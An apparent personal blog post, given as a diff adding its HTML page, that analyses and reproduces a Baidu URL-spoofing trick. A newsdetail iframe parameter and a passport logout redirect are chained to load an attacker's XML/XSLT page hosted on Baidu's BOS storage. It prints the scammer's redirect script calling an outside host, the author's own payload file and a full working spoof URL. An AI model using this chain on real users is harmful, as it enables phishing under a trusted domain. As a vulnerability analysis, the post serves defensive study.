@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark_colorblind" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    <link rel="icon" href="https://avatars.githubusercontent.com/u/115192496?v=4"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="- **场景介绍**
+骗子给了一个网站诱导访问，链接很长，看开头是百度的官方链接，`https://m.baidu.com/?from=ddcai#iact=wiseindex/tabs/news/activity/newsdetail`  所以安全意识不强的肯定以为是安全的网站，然后点进去后就中招了
+
+- **名词解释**
+这种漏洞允许攻击者构造一个看似合法的URL（例如 `https://a.com/url=https://b.com` ），但实际上会显示来自另一个不受信任的网站（如 `https://b.com` ）的内容，而用户的浏览器地址栏中显示的仍然是原网站的URL (`https://a.com` )。">
+<meta property="og:title" content="网络安全之百度URL欺骗漏洞分析和复现">
+<meta property="og:description" content="- **场景介绍**
+骗子给了一个网站诱导访问，链接很长，看开头是百度的官方链接，`https://m.baidu.com/?from=ddcai#iact=wiseindex/tabs/news/activity/newsdetail`  所以安全意识不强的肯定以为是安全的网站，然后点进去后就中招了
+
+- **名词解释**
+这种漏洞允许攻击者构造一个看似合法的URL（例如 `https://a.com/url=https://b.com` ），但实际上会显示来自另一个不受信任的网站（如 `https://b.com` ）的内容，而用户的浏览器地址栏中显示的仍然是原网站的URL (`https://a.com` )。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="http://blog.52013120.xyz/post/wang-luo-an-quan-zhi-bai-du-URL-qi-pian-lou-dong-fen-xi-he-fu-xian.html">
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/115192496?v=4">
+<title>网络安全之百度URL欺骗漏洞分析和复现</title>
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">网络安全之百度URL欺骗漏洞分析和复现</h1>
+<div class="title-right">
+    <a href="http://blog.52013120.xyz" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><ul>
+<li>
+<p><strong>场景介绍</strong><br>
+骗子给了一个网站诱导访问，链接很长，看开头是百度的官方链接，<code class="notranslate">https://m.baidu.com/?from=ddcai#iact=wiseindex/tabs/news/activity/newsdetail</code>  所以安全意识不强的肯定以为是安全的网站，然后点进去后就中招了</p>
+</li>
+<li>
+<p><strong>名词解释</strong><br>
+这种漏洞允许攻击者构造一个看似合法的URL（例如 <code class="notranslate">https://a.com/url=https://b.com</code> ），但实际上会显示来自另一个不受信任的网站（如 <code class="notranslate">https://b.com</code> ）的内容，而用户的浏览器地址栏中显示的仍然是原网站的URL (<code class="notranslate">https://a.com</code> )。</p>
+</li>
+<li>
+<p>攻击者可以利用这种漏洞来实施钓鱼攻击，让用户相信他们正在访问一个可信网站，而实际上他们正在与一个恶意网站交互。</p>
+</li>
+<li>
+<p><strong>漏洞的影响</strong></p>
+</li>
+<li>
+<p>钓鱼攻击：攻击者可以创建看似可信的URL，但实际上这些URL会重定向到钓鱼网站，这些网站可能会窃取用户的敏感信息，如密码和个人数据。</p>
+</li>
+<li>
+<p>安全绕过：用户可能会被重定向去下载恶意软件或其他有害内容，却误以为这些内容来自可信的来源。<br>
+个人分析</p>
+</li>
+<li>
+<p>骗子链接如下</p>
+</li>
+</ul>
+<p><a href="https://m.baidu.com/?from=ddcai#iact=wiseindex/tabs/news/activity/newsdetail=%7B%22linkData%22:%7B%22name%22:%22iframe/mib-iframe%22,%22url%22:%22https://passport.baidu.com/?logout=&amp;aid=7&amp;u=https://data5678.bj.bcebos.com/16556/mc?data=kG1e6hRQytb7Uk2B6sXrCdzDEo5eN9ta6Xu4YWzI4deXwu3aG02sNOw5-QYUjq7F%22%7D%7D" rel="nofollow">https://m.baidu.com/?from=ddcai#iact=wiseindex/tabs/news/activity/newsdetail={“linkData”:{“name”:“iframe/mib-iframe”,“url”:“https://passport.baidu.com/?logout=&amp;aid=7&amp;u=https://data5678.bj.bcebos.com/16556/mc?data=kG1e6hRQytb7Uk2B6sXrCdzDEo5eN9ta6Xu4YWzI4deXwu3aG02sNOw5-QYUjq7F”}} 45</a></p>
+<pre class="notranslate"><code class="notranslate">{
+    "linkData": {
+        "name": "iframe/mib-iframe",
+        "url": "https://passport.baidu.com/?logout=&amp;aid=7&amp;u=https://data5678.bj.bcebos.com/16556/mc?data=kG1e6hRQytb7Uk2B6sXrCdzDEo5eN9ta6Xu4YWzI4deXwu3aG02sNOw5-QYUjq7F"
+    }
+}
+</code></pre>
+<blockquote>
+<p>这个应该是百度新闻（百家号）的一个页面，原本应该是百度引用自己家网站其他页面的信息所用。</p>
+</blockquote>
+<blockquote>
+<p>页面中iframe链接被替换成了骗子自己的网站（现在钓鱼网站已被删除，现在显示404）。</p>
+</blockquote>
+<ul>
+<li>linkData中的url</li>
+</ul>
+<p><a href="https://passport.baidu.com/?logout=&amp;aid=7&amp;u=https://data5678.bj.bcebos.com/16556/mc?data=kG1e6hRQytb7Uk2B6sXrCdzDEo5eN9ta6Xu4YWzI4deXwu3aG02sNOw5-QYUjq7F" rel="nofollow">https://passport.baidu.com/?logout=&amp;aid=7&amp;u=https://data5678.bj.bcebos.com/16556/mc?data=kG1e6hRQytb7Uk2B6sXrCdzDEo5eN9ta6Xu4YWzI4deXwu3aG02sNOw5-QYUjq7F 17</a></p>
+<ul>
+<li>
+<p>这个应该是百度的退出链接，退出登录后跳转到 <a href="https://data5678.bj.bcebos.com/" rel="nofollow">https://data5678.bj.bcebos.com/</a> 这个域名（后面带的data参数不重要，后来发现是骗子用来识别从哪里跳转过来然后给什么地址的参数）。</p>
+</li>
+<li>
+<p>尝试替换其他域名均跳转到 <code class="notranslate">baidu.com</code> 百度首页，这个域名其实是百度云对象存储BOS的域，在百度自家白名单内。</p>
+</li>
+<li>
+<p>页面内容</p>
+</li>
+</ul>
+<pre class="notranslate"><code class="notranslate">&lt;?xml version="1.0" encoding="utf-8" standalone="yes"?&gt;
+&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns="http://www.w3.org/1999/xhtml"&gt;
+    &lt;xsl:template match="/"&gt;
+        &lt;html&gt;
+            &lt;head&gt;
+                &lt;title&gt;...&lt;/title&gt;
+                &lt;meta content="always" name="referrer"/&gt;
+            &lt;/head&gt;
+            &lt;body&gt;
+                &lt;script&gt;&lt;![CDATA[
+                    document.addEventListener("DOMContentLoaded", function() {
+                        processData();
+                    });
+
+                    function processData() {
+                        var data = decodeURIComponent(window.location.search.substr(1)); // 解码URL参数
+                        // 只在调用后端接口时在sbm后追加/time
+                        var apiEndpoint = 'https://book.muzhix.cn/rpa.php';
+                        data = data.split('data=')[1];
+                        var xhr = new XMLHttpRequest();
+                        xhr.open('GET', apiEndpoint + '?data=' + data, true);
+                        xhr.onreadystatechange = function () {
+                            if (xhr.readyState === XMLHttpRequest.DONE &amp;&amp; xhr.status === 200) {
+                                var responseData = JSON.parse(xhr.responseText);
+                                window.location.href = responseData.data;
+                            }
+                        };
+                        xhr.send();
+                    }
+                ]]&gt;&lt;/script&gt;
+            &lt;/body&gt;
+        &lt;/html&gt;
+    &lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;
+
+</code></pre>
+<ul>
+<li>看不太懂前后的xml，丢给AI解释。</li>
+</ul>
+<pre class="notranslate"><code class="notranslate">这个 XSLT 样式表是用来将 XML 输入转换成 HTML 页面的。
+页面中包含 JavaScript 代码，用于处理 URL 参数并使用 AJAX 向服务器端脚本发送请求。
+</code></pre>
+<ul>
+<li>
+<p>最后是用xhr请求数据，拼接链接 window.location.href 替换掉iframe的链接。<br>
+实现内容的替换。</p>
+</li>
+<li>
+<p>漏洞复现</p>
+</li>
+<li>
+<p>注册百度云对象存储BOS。</p>
+</li>
+<li>
+<p>新建存储桶，地域随便，读写权限为公共读。<br>
+创建的北京节点一直上传失败，只能换一个广州的了，</p>
+</li>
+<li>
+<p>修改代码，其他不要直接替换链接</p>
+</li>
+</ul>
+<pre class="notranslate"><code class="notranslate">&lt;html&gt;
+    &lt;head&gt;
+        &lt;title&gt;...&lt;/title&gt;
+        &lt;meta content="always" name="referrer"/&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;script&gt;
+            document.addEventListener("DOMContentLoaded", function() {
+                processData();
+            });
+
+            function processData() {
+                var url = 'https://linux.do/u/k452b';
+                window.location.href = url;
+            }
+        &lt;/script&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+
+</code></pre>
+<ul>
+<li>上传后，发现死活无法访问只能下载，抓包查看响应头被加上了 <code class="notranslate">Content-Disposition:'attachment=filename;</code> 所以只能下载。</li>
+</ul>
+<p>遂找到 <code class="notranslate">储存桶设置 – 配置管理 – 静态网站托管</code> 打开，但也失败，始终是下载。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/37783605d2865fb8ecec4bf861f3b7d62051a590c3abaffa7217ca494bf15c31/68747470733a2f2f6c696e75782e646f2f75706c6f6164732f64656661756c742f6f726967696e616c2f33582f302f662f306662363566306634623961616336653962323736653733383938353865373831366366356431662e706e67"><img src="https://camo.githubusercontent.com/37783605d2865fb8ecec4bf861f3b7d62051a590c3abaffa7217ca494bf15c31/68747470733a2f2f6c696e75782e646f2f75706c6f6164732f64656661756c742f6f726967696e616c2f33582f302f662f306662363566306634623961616336653962323736653733383938353865373831366366356431662e706e67" alt="转载" data-canonical-src="https://linux.do/uploads/default/original/3X/0/f/0fb65f0f4b9aac6e9b276e7389858e7816cf5d1f.png" style="max-width: 100%;"></a></p>
+<p>打开文档阅读说明如下：只要是以官方域访问html的，均为下载形式。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/7d6d279ebe15aea0c637007084997014aa71bb6de8c1c063838af611ac3fd79b/68747470733a2f2f6c696e75782e646f2f75706c6f6164732f64656661756c742f6f726967696e616c2f33582f342f632f346338643430623534623330313965353235643861373536366237666531353739363365623830642e706e67"><img src="https://camo.githubusercontent.com/7d6d279ebe15aea0c637007084997014aa71bb6de8c1c063838af611ac3fd79b/68747470733a2f2f6c696e75782e646f2f75706c6f6164732f64656661756c742f6f726967696e616c2f33582f342f632f346338643430623534623330313965353235643861373536366237666531353739363365623830642e706e67" alt="转载" data-canonical-src="https://linux.do/uploads/default/original/3X/4/c/4c8d40b54b3019e525d8a7566b7fe157963eb80d.png" style="max-width: 100%;"></a></p>
+<ul>
+<li>重新抓包骗子的网页，发现<code class="notranslate">Content-Type: text/xml</code>，难道格式是xml？也难怪前后都是xml标签。</li>
+<li>重新整，修改代码后，把格式改为xml重新上传，打开百度云提供的域名成功跳转到 <code class="notranslate">https://linux.do/u/k452b</code></li>
+</ul>
+<pre class="notranslate"><code class="notranslate">&lt;?xml version="1.0" encoding="utf-8" standalone="yes"?&gt;
+&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns="http://www.w3.org/1999/xhtml"&gt;
+    &lt;xsl:template match="/"&gt;
+        &lt;html&gt;
+            &lt;head&gt;
+                &lt;title&gt;...&lt;/title&gt;
+                &lt;meta content="always" name="referrer"/&gt;
+            &lt;/head&gt;
+            &lt;body&gt;
+                &lt;script&gt;&lt;![CDATA[
+                    document.addEventListener("DOMContentLoaded", function() {
+                        processData();
+                    });
+
+                    function processData() {
+                        var url = 'https://linux.do/u/k452b';
+                        window.location.href = url
+                    }
+                ]]&gt;&lt;/script&gt;
+            &lt;/body&gt;
+        &lt;/html&gt;
+    &lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;
+
+</code></pre>
+<ul>
+<li>
+<p>重新整理拼接url，访问后iframe中提示linux.do拒绝了我们的请求。<br>
+<a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/a186e04da224121911e0bd5fae17eecbd7bf2171d96c4fd131c96f1702712a2f/68747470733a2f2f6c696e75782e646f2f75706c6f6164732f64656661756c742f6f726967696e616c2f33582f662f322f663233616634313535316161323165323133343734666634303463633934346433333536303066632e706e67"><img src="https://camo.githubusercontent.com/a186e04da224121911e0bd5fae17eecbd7bf2171d96c4fd131c96f1702712a2f/68747470733a2f2f6c696e75782e646f2f75706c6f6164732f64656661756c742f6f726967696e616c2f33582f662f322f663233616634313535316161323165323133343734666634303463633934346433333536303066632e706e67" alt="转载" data-canonical-src="https://linux.do/uploads/default/original/3X/f/2/f23af41551aa21e213474ff404cc944d335600fc.png" style="max-width: 100%;"></a></p>
+</li>
+<li>
+<p>抓包看是同源策略导致无法显示，换一个没有同源策略的网站后成功显示网站。</p>
+</li>
+</ul>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/2d5e59884d6fbd28e7c97441624e5ddcc0d94cfd30c5149dd3946893b9abebfc/68747470733a2f2f6c696e75782e646f2f75706c6f6164732f64656661756c742f6f726967696e616c2f33582f622f612f626166336565313136326630323433313166393362356138313430663663623336336637373134652e706e67"><img src="https://camo.githubusercontent.com/2d5e59884d6fbd28e7c97441624e5ddcc0d94cfd30c5149dd3946893b9abebfc/68747470733a2f2f6c696e75782e646f2f75706c6f6164732f64656661756c742f6f726967696e616c2f33582f622f612f626166336565313136326630323433313166393362356138313430663663623336336637373134652e706e67" alt="转载" data-canonical-src="https://linux.do/uploads/default/original/3X/b/a/baf3ee1162f024311f93b5a8140f6cb363f7714e.png" style="max-width: 100%;"></a></p>
+<ul>
+<li>域名不变，iframe框架内容被替换。</li>
+</ul>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/5003bf6f99b4a73d4d389357c21b76b18c36a8078ee1419a9d11df7a05330a26/68747470733a2f2f6c696e75782e646f2f75706c6f6164732f64656661756c742f6f726967696e616c2f33582f372f322f373236666331613533636261373562643739343139363862656637316464623230643264353939362e6a706567"><img src="https://camo.githubusercontent.com/5003bf6f99b4a73d4d389357c21b76b18c36a8078ee1419a9d11df7a05330a26/68747470733a2f2f6c696e75782e646f2f75706c6f6164732f64656661756c742f6f726967696e616c2f33582f372f322f373236666331613533636261373562643739343139363862656637316464623230643264353939362e6a706567" alt="转载" data-canonical-src="https://linux.do/uploads/default/original/3X/7/2/726fc1a53cba75bd7941968bef71ddb20d2d5996.jpeg" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/5dcbad02c17c3e63acda2bb1eeafd63b8f2c0393d52162341edb9c732d44ed71/68747470733a2f2f6c696e75782e646f2f75706c6f6164732f64656661756c742f6f726967696e616c2f33582f392f652f396537626665353061643830336631396634663465333639616564373466326533376535633432612e6a706567"><img src="https://camo.githubusercontent.com/5dcbad02c17c3e63acda2bb1eeafd63b8f2c0393d52162341edb9c732d44ed71/68747470733a2f2f6c696e75782e646f2f75706c6f6164732f64656661756c742f6f726967696e616c2f33582f392f652f396537626665353061643830336631396634663465333639616564373466326533376535633432612e6a706567" alt="转载" data-canonical-src="https://linux.do/uploads/default/original/3X/9/e/9e7bfe50ad803f19f4f4e369aed74f2e37e5c42a.jpeg" style="max-width: 100%;"></a></p>
+<ul>
+<li>完整链接<br>
+url编码后</li>
+</ul>
+<p><a href="https://m.baidu.com/?from=ddcai#iact=wiseindex/tabs/news/activity/newsdetail=%7B%2522linkData%2522%253A%7B%2522name%2522%253A%2522iframe%252Fmib-iframe%2522%252C%2522url%2522%253A%2522https%253A%252F%252Fpassport.baidu.com%252F%253Flogout%253D%2526aid%253D7%2526u%253Dhttps%253A%252F%252Flinuxdo.gz.bcebos.com%252Flinuxdo.xml%2522%7D%7D" rel="nofollow">https://m.baidu.com/?from=ddcai#iact=wiseindex/tabs/news/activity/newsdetail=%7B%2522linkData%2522%253A%7B%2522name%2522%253A%2522iframe%252Fmib-iframe%2522%252C%2522url%2522%253A%2522https%253A%252F%252Fpassport.baidu.com%252F%253Flogout%253D%2526aid%253D7%2526u%253Dhttps%253A%252F%252Flinuxdo.gz.bcebos.com%252Flinuxdo.xml%2522%7D%7D 86</a></p>
+<ul>
+<li>总结<br>
+这个链接利用了百度内部的一些机制，如 iframe 的加载方式和 URL 参数的处理。</li>
+</ul>
+<p>绕过iframe域名白名单</p>
+<p>攻击者找到了一种方法，即使用百度自己的域名（如百度云对象存储 BOS 的域名 <code class="notranslate">bj.bcebos.com</code> 或 <code class="notranslate">gz.bcebos.com</code>）来加载恶意内容。<br>
+由于这些域名属于百度内部，攻击者通过这些域名上传恶意内容，从而绕过了白名单机制。<br>
+在百度云对象储存BOS中</p>
+<p>攻击者发现了通过上传 XML 文件绕过HTML文件的限制，XML 文件被浏览器解析为HTML网页并执行其中的JS代码。<br>
+这种方法利用了浏览器对 XML 的默认处理方式，即作为文本类型解析，而不是强制下载。</p>
+<p><strong>本文转自 <a href="https://linux.do/t/topic/168244" rel="nofollow">https://linux.do/t/topic/168244</a></strong></p></div>
+<div style="font-size:small;margin-top:8px;float:right;">❤️转载请注明出处❤️</div>
+
+</div>
+    <div id="footer">博客 © <span id="year"></span><a href="http://blog.52013120.xyz"> 繁星点点 </a>
+<p>
+<span id="runday"></span>
+</p>
+
+<script>
+if("07/01/2024"!=""){
+    var now=new Date();
+    var startSite=new Date("07/01/2024");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("year").innerHTML=now.getFullYear();
+    if(""!=""){document.getElementById("runday").innerHTML=" • "+"网站运行"+diffDay+"天"+" • ";}
+    else{document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";}
+}
+</script>
+</div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n\n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+</script>
+
+
+</html>
